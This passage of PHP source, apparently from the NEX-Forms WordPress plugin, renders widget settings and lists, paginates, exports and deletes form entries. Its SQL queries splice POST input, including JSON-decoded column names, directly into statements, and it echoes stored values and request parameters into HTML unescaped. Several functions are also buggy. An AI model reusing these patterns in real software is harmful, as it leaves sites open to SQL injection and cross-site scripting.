		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #f0ad4e; border-radius:4px; border:1px solid #eea236; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+button_color.id+]" name="[+button_color.name+]" '.((NEXForms_widget_controls::parse('[+button_color.value+]', $placeholders))=='btn-warning' ? 'checked="checked"' : '').' value="btn-warning"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #d9534f; border-radius:4px; border:1px solid #d43f3a; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+button_color.id+]" name="[+button_color.name+]" '.((NEXForms_widget_controls::parse('[+button_color.value+]', $placeholders))=='btn-danger' ? 'checked="checked"' : '').' value="btn-danger"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp';
		$tpl  .= '<label style="margin-right: 5px;background: none repeat scroll 0 0 #ffffff; border-radius:4px; border:1px solid #cccccc; display: block;float: left; height: 23px; width: 30px;">&nbsp;&nbsp;<input id="[+button_color.id+]" name="[+button_color.name+]" '.((NEXForms_widget_controls::parse('[+button_color.value+]', $placeholders))=='btn-default' ? 'checked="checked"' : '').' value="btn-default"  type="radio" class="widefat"  />&nbsp;&nbsp;</label>&nbsp;&nbsp</p>';
		
		$tpl  .= '<p><label for="[+text.id+]"><strong>Button/link Text </strong></label><input type="text" id="[+text.id+]" name="[+text.name+]" value="'.NEXForms_widget_controls::parse('[+text.value+]', $placeholders).'" class="widefat" /><p>';
		
		
		
		
		
		print NEXForms_widget_controls::parse($tpl, $placeholders);
	}
	static function register_this_widget(){
		register_widget(__CLASS__);
	}
}
   
class NEXForms_widget_controls {
	static function parse($tpl, $hash){
   	   foreach ($hash as $key => $value)
			$tpl = str_replace('[+'.$key.'+]', $value, $tpl);
	   return $tpl;
	}
}

class NEXForms_form_entries{
	
	public $data_fields;
	
	public function __construct(){
		//$this->add_new();
	}
	
	public function delete_form(){
			global $wpdb;
			$do_delete = $wpdb->prepare('DELETE FROM ' .$wpdb->prefix. 'wap_nex_forms WHERE Id = '.filter_var($_POST['Id'],FILTER_SANITIZE_NUMBER_INT));
			$wpdb->query($do_delete);
			die();
		}

	
	
	public function convert_form_entries(){
	
	
			global $wpdb;
			
		$get_forms = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms');
		$forms = $wpdb->get_results($get_forms);
		
		foreach($forms as $form)
			{
			$get_form_data = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($form->Id,FILTER_SANITIZE_NUMBER_INT));
			$form_data = $wpdb->get_results($get_form_data);
			
			$form_field_array = json_decode($form_fields->form_fields,true);
			
			foreach($form_data as $set_header)	
					{ 
					$headers[$set_header->meta_key] = ''.IZC_Functions::format_name($set_header->meta_key);
					}
				array_unique($headers);	
				
				
				$sql = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($form->Id,FILTER_SANITIZE_NUMBER_INT).' GROUP BY time_added  ORDER BY time_added');
				$results 	= $wpdb->get_results($sql);
				
				
				if($results)
					{
					$i = 1;			
					foreach($results as $data)
						{
						$old_record = $data->time_added;	
						
						$val = array();
						
							$k =1;
							foreach($headers as $heading)	
								{
								$get_check_field = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE meta_key="'.$heading.'" AND time_added="'.$data->time_added.'"');
								$check_field = $wpdb->get_row($get_check_field);
								if($check_field)
									{
									$val[] = array('field_name'=>$heading,'field_value'=>$check_field->meta_value);
									}
								$k++;
								}
						if($new_record!=$old_record)
							{
							
							$insert = $wpdb->prepare($wpdb->insert($wpdb->prefix.'wap_nex_forms_entries',
								array(								
									'nex_forms_Id'			=>	$data->nex_forms_Id,
									'page'					=>	'undefined',
									'ip'					=>  'undefined',
									'user_Id'				=>	'1',
									'viewed'				=>	'no',
									'date_time'				=>   date('Y-m-d H:i:s',$data->time_added),
									'form_data'				=>	json_encode($val,true)
									)
							 )		
							 );			
							}
						$do_insert = $wpdb->query($insert);
						
						$new_record = $old_record;
						$i++;
						}
					}
				else
					{	
					$output .= '<div class="ui-state-error" style="border-radius: 7px 7px 7px 7px;margin-bottom: 10px; padding: 5px 10px;width: 98%;display:block;"><span class="ui-icon ui-icon-alert" style="float: left; margin-right: .3em;"></span>No entries found.</div>';
				
					}
			}
			update_option('nex-forms-convert-old-form-entries','1');
	}
	
	
	
	public function build_form_data_table($form_id=''){
		
		global $wpdb;
		if(!$form_id)
			$form_id = filter_var($_POST['form_Id'],FILTER_SANITIZE_NUMBER_INT);

		$csv_data = '';
		
		$get_form_fields = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms WHERE Id='.filter_var($form_id,FILTER_SANITIZE_NUMBER_INT));
		$form_fields = $wpdb->get_row($get_form_fields);
		
		
		$get_form_data = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($form_id,FILTER_SANITIZE_NUMBER_INT));
		$form_data = $wpdb->get_results($get_form_data);
		
		$form_field_array = json_decode($form_fields->form_fields,true);
		
		foreach($form_data as $set_header)	
				{ 
				$headers[$set_header->meta_key] = ''.IZC_Functions::format_name($set_header->meta_key);
				}
			array_unique($headers);		
			$output .= '<form method="post" action="" id="posts-filter">';

				$output .= '<div class="tablenav top">';
					$output .= '<a class="btn btn-primary export_csv"><span class="fa fa-cloud-download"></span>&nbsp;&nbsp;Export Form Entries (csv)</a><br />
';
					$output	.= '<div class="nex-table-nav">';
					
					$total_records = NEXForms_form_entries::get_total_form_entries($form_id);
		
						$total_pages = ((is_float($total_records/10)) ? (floor($total_records/10))+1 : $total_records/10);
						
						$output .= '<span class="displaying-num"><strong>'.$total_records.'</strong> entries</span>';
						if($total_pages>1)
							{				
							$output .= '<span class="pagination-links">';
							$output .= '<a class="first-page wafb-first-page">&lt;&lt;</a>&nbsp;';
							$output .= '<a title="Go to the next page" class="wafb-prev-page prev-page">&lt;</a>&nbsp;';
							$output .= '<span class="paging-input"> ';
							$output .= '<span class="current-page">'.(filter_var($_POST['current_page'],FILTER_SANITIZE_NUMBER_INT)+1).'</span> of <span class="total-pages">'.$total_pages.'</span>&nbsp;</span>';
							$output .= '<a title="Go to the next page" class="wafb-next-page next-page">&gt;</a>&nbsp;';
							$output .= '<a title="Go to the last page" class="wafb-last-page last-page">&gt;&gt;</a></span>';
							}
					
					$output	.= '</div>';
					
				$output .= '</div>';
	
				$output .= '<br class="clear">';
		$output .= '<table cellspacing="0" class="wp-list-table resiable-columns widefat fixed tags iz-list-table resizabletable" id="iz_col_resize">';
		
			$output .= '<thead>';
			$output .= '<tr>';
			foreach($headers as $header)	
					{
						$csv_data .= IZC_Functions::unformat_name($header).',';
						$output .= '<th valign="bottom" class="manage-column"><span class="">'.IZC_Functions::unformat_name($header).'</span></th>'; //<span class="sorting-indicator"></span>
					}
			$csv_data .= '
	';
			$output .= '</tr>';
			$output .= '</thead>';
			
			$output .= '<tfoot>';
			$output .= '<tr>';
			
			foreach($headers as $header)	
					{
					$output .= '<th valign="bottom" class="manage-column"><span class="">'.IZC_Functions::unformat_name($header).'</span></th>';
					}
			
			$output .= '</tr>';
			$output .= '</tfoot>';
			
			$output .= '<tbody class="list:tag" id="the-list">';
			
			$sql = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($form_id,FILTER_SANITIZE_NUMBER_INT).' GROUP BY time_added ORDER BY time_added DESC
								LIMIT '.((isset($_POST['current_page'])) ? filter_var($_POST['current_page'],FILTER_SANITIZE_NUMBER_INT)*10 : '0'  ).',10 ');
			$results 	= $wpdb->get_results($sql);
			
			$sql2 = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($form_id,FILTER_SANITIZE_NUMBER_INT).' GROUP BY time_added ORDER BY time_added DESC');
			$csv_results 	= $wpdb->get_results($sql2);

			if($results)
				{
				$i = 1;			
				foreach($results as $data)
					{
					$old_record = $data->time_added;	
					
					if($new_record!=$old_record && $i!=1)
						{
						$output .= '</tr>';	
						}
					
					if($new_record!=$old_record)
						{
						$output .= '<tr class="parent" id="tag-'.$data->Id.'">';
						}
						$k =1;
						foreach($headers as $heading)	
							{
							$get_check_field = $wpdb->prepare('SELECT meta_key,meta_value FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE meta_key="'.$heading.'" AND time_added="'.$data->time_added.'"');
							$check_field = $wpdb->get_row($get_check_field);
							if($check_field)
								{
								
								$val = $check_field->meta_value;
								
								if(strstr($check_field->meta_value,'wp-content'))
									{
									$get_extension = explode('.',$check_field->meta_value);
									
									$get_file_name = explode('/',$get_extension[0]);
									
									$val = '<a href="'.$check_field->meta_value.'" target="_blank"><img width="30" src="'.WP_PLUGIN_URL.'/X%20Forms/includes/Core/images/icons/ext/'.$get_extension[count($get_extension)-1].'.png">'.$get_file_name[count($get_file_name)-1].'</a>';
									$image_extensions = array('jpg','jpeg','gif','png','bmp');
									foreach($image_extensions as $image_extension)
										{
										if(stristr($check_field->meta_value,$image_extension))
											{
											$val = '<a href="'.$check_field->meta_value.'" ><img src="'.$check_field->meta_value.'" style="max-width:100px" ></a>';
											}
										}
									}
								else
									{
									$val = $check_field->meta_value;
									}
								
								$output .= '<td class="manage-column column-'.$heading.'">'.$val.'&nbsp;';
								$output .= (($k==1) ? '<div class="row-actions"><span class="delete"><a href="javascript:delete_form_entry(\''.$data->time_added.'\',\''.$data->Id.'\');" >Delete</a></span></div>' : '' ).'</td>';
								
								$output .= '</td>';
								}
							else
								{
								$output .= '<td class="manage-column column-'.$heading.'">&nbsp;'; 
								$output .= (($k==1) ? '<div class="row-actions"><span class="delete"><a href="javascript:delete_form_entry(\''.$data->time_added.'\',\''.$data->Id.'\');" >Delete</a></span></div>' : '' ).'</td>';
								}
							$k++;
							}
					$new_record = $old_record;
					$i++;
					}
				}
			else
				{	
				$output .= '<div class="ui-state-error" style="border-radius: 7px 7px 7px 7px;margin-bottom: 10px; padding: 5px 10px;width: 98%;display:block;"><span class="ui-icon ui-icon-alert" style="float: left; margin-right: .3em;"></span>No entries found.</div>';
			
				}
/********************/
/****** CSV *********/

/********************/
			if($csv_results)
				{
				$i = 1;			
				foreach($csv_results as $data)
					{
					$old_record = $data->time_added;
					if($new_record!=$old_record && $i!=1)
						{
						$csv_data .= '
';
						}
					foreach($headers as $heading)	
						{
							$get_check_field = $wpdb->prepare('SELECT meta_key,meta_value FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE meta_key="'.$heading.'" AND time_added="'.$data->time_added.'"');
							$check_field = $wpdb->get_row($get_check_field);
							
							$content = str_replace('\r\n',' ',$check_field->meta_value);
							$content = str_replace('\r',' ',$content);
							$content = str_replace('\n',' ',$content);
							$content = str_replace(',',' ',$content);
							$content = str_replace('
							',' ',$content);
							$content = str_replace('
							
							',' ',$content);
							$content = str_replace(chr(10),' ',$content);
							$content = str_replace(chr(13),' ',$content);
							$content = str_replace(chr(266),' ',$content);
							$content = str_replace(chr(269),' ',$content);
							$content = str_replace(chr(522),' ',$content);
							$content = str_replace(chr(525),' ',$content);
							$csv_data .= $content.',';
						}
					$new_record = $old_record;
					$i++;
					}
				}
			else
				{
				$csv_data .= 'no form entries';
				}
			
					
						$output .= '</tbody>';
					$output .= '</table>';
				$output .= '</form>';
				
				$output .= "<input type='hidden' name='additional_params' value='".json_encode($additional_params)."'>";
				$output .= "<input type='hidden' name='table_headers' value='".json_encode($headers)."'>";
				$output .= '<input type="hidden" name="page" value="'.$_REQUEST['page'].'">';
				$output .= '<input type="hidden" name="orderby" value="">';
				$output .= '<input type="hidden" name="order" value="desc">';
				$output .= '<input type="hidden" name="current_page" value="0">';
				$output .= '<input type="hidden" name="wa_form_Id" value="'.filter_var($_POST['form_Id'],FILTER_SANITIZE_NUMBER_INT).'">';

			/*$output .= '<form name="export_csv" method="post" action="'.get_option('siteurl').'/wp-content/plugins/nex-forms/includes/export.php" id="posts-filter" style="display:none;">';
				$output .= '<textarea name="csv_content">'.$csv_data.'</textarea>';	
				$output .= '<input name="_title" value="'.IZC_Database::get_title($form_id,'wap_nex_forms').'">';	
			$output .= '</form>';*/
			
		if(filter_var($_POST['form_Id'],FILTER_SANITIZE_NUMBER_INT))	{
			echo $output;
			die();
		}
		else
			return $output;
	}
	
	
	public function get_form_data(){

		global $wpdb;
		
		$args 		= str_replace('\\','',$_POST['args']);
		$headings 	= json_decode($args);

		
		$sql = $wpdb->prepare('SELECT * FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($_POST['form_Id'],FILTER_SANITIZE_NUMBER_INT).' GROUP BY time_added ORDER BY time_added DESC
										LIMIT '.((isset($_POST['current_page'])) ? filter_var($_POST['current_page'],FILTER_SANITIZE_NUMBER_INT)*10 : '0'  ).',10 ');
		$results 	= $wpdb->get_results($sql);

		if($results)
			{
			$i = 1;			
			foreach($results as $data)
				{
				$old_record = $data->last_update;	
				
				if($new_record!=$old_record && $i!=1)
					{
					$output .= '</tr>';	
					}
				
				if($new_record!=$old_record)
					{
					$output .= '<tr class="parent" id="tag-'.$data->Id.'">';
					}
					$k =1;
					foreach($headings as $heading)	
						{						
							$get_check_field = $wpdb->prepare('SELECT meta_key,meta_value FROM '.$wpdb->prefix.'wap_nex_forms_meta WHERE meta_key="'.$heading.'" AND time_added="'.$data->time_added.'"');					
							$check_field = $wpdb->get_row($get_check_field);
							
							if($check_field)
								{
								$val = $check_field->meta_value;
								
								if(strstr($check_field->meta_value,'wp-content'))
									{
									$get_extension = explode('.',$check_field->meta_value);
									
									$get_file_name = explode('/',$get_extension[0]);
									
									$image_extensions = array('jpg','jpeg','gif','png','bmp');
									foreach($image_extensions as $image_extension)
										{
										if(stristr($check_field->meta_value,$image_extension))
											{
											$val = '<a href="'.$check_field->meta_value.'" ><img src="'.$check_field->meta_value.'" style="max-width:100px" ></a>';
											}
										}
									}
								else
									{
									$val = $check_field->meta_value;
									}
								$output .= '<td class="manage-column column-'.$heading.'">'.$val.'&nbsp;';
								$output .= (($k==1) ? '<div class="row-actions"><span class="delete"><a href="javascript:delete_form_entry(\''.$data->time_added.'\',\''.$data->Id.'\');" >Delete</a></span></div>' : '' ).'</td>';

								$output .= '</td>';
								}
							else
								{
								$output .= '<td class="manage-column column-'.$heading.'">&nbsp;'; 
								$output .= (($k==1) ? '<div class="row-actions"><span class="delete"><a href="javascript:delete_form_entry(\''.$data->time_added.'\',\''.$data->Id.'\');" >Delete</a></span></div>' : '' ).'</td>';
								}
						$k++;
						}
				$new_record = $old_record;
				$i++;
				}
			}
		else
			{
			$output .= '<tr>';	
			$output .= '<td class="manage-column" colspan="'.(count($headings)).'">Sorry, No entires found</td>';
			$output .= '</tr>';
			}
			
		echo $output;
		die();
	}
	
	
	public function from_entries_table_pagination(){

		
		$total_records = NEXForms_form_entries::get_total_form_entries(filter_var($_POST['wa_form_Id'],FILTER_SANITIZE_NUMBER_INT));
		
		$total_pages = ((is_float($total_records/10)) ? (floor($total_records/10))+1 : $total_records/10);
		
		$output .= '<span class="displaying-num"><strong>'.NEXForms_form_entries::get_total_form_entries(filter_var($_POST['wa_form_Id'],FILTER_SANITIZE_NUMBER_INT)).'</strong> entries</span>';
		if($total_pages>1)
			{				
			$output .= '<span class="pagination-links">';
			$output .= '<a class="first-page wafb-first-page">&lt;&lt;</a>&nbsp;';
			$output .= '<a title="Go to the next page" class="wafb-prev-page prev-page">&lt;</a>&nbsp;';
			$output .= '<span class="paging-input"> ';
			$output .= '<span class="current-page">'.(filter_var($_POST['current_page'],FILTER_SANITIZE_NUMBER_INT)+1).'</span> of <span class="total-pages">'.$total_pages.'</span>&nbsp;</span>';
			$output .= '<a title="Go to the next page" class="wafb-next-page next-page">&gt;</a>&nbsp;';
			$output .= '<a title="Go to the last page" class="wafb-last-page last-page">&gt;&gt;</a></span>';
			}
		echo $output;
		die();
	}
	
	public function get_total_form_entries($wa_form_Id){
		global $wpdb;
		$do_get_count  = $wpdb->get_results('SELECT Id FROM '.$wpdb->prefix .'wap_nex_forms_meta WHERE nex_forms_Id='.filter_var($wa_form_Id,FILTER_SANITIZE_NUMBER_INT).' GROUP BY time_added');
		$get_count  = $wpdb->get_results($do_get_count);

		return count($get_count);
	}
	
	public function delete_form_entry(){
		global $wpdb;
		
		$do_delete = $wpdb->prepare('DELETE FROM ' .$wpdb->prefix. 'wap_nex_forms_meta WHERE time_added = "'.filter_var($_POST['last_update'],FILTER_SANITIZE_NUMBER_INT).'"');
		$wpdb->query($do_delete);

		IZC_Functions::print_message( 'updated' , 'Item deleted' );
		die();
	}	
}

?>